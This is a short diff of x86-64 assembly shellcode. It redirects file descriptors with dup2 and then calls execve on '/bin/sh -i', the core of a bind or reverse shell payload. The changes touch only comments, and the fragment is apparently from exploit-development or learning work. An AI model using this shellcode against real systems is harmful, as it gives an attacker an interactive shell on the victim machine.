@@ -19,13 +19,13 @@ mov sil,0x2
 mov al,0x21
 syscall
 
-; execve("//bin/sh", ["//bin/sh", "-i", 0], 0)
+; execve("/bin/sh", ["/bin/sh", "-i", 0], 0)
 mov qword rbx,'//bin/sh'	; rbx = //bin/sh
 shr rbx,0x8			; remove leading / from rbx
 push rbx			; push rbx to stack
 mov rdi,rsp			; set rdi (arg 1) to top of stack
 
-xor rbx,rbx
+xor rbx,rbx			; rbx = 0
 mov bx,'-i'			; rbx = '-i'
 push rbx			; push rbx to stack
 mov rcx,rsp			; set rcx to top of stack
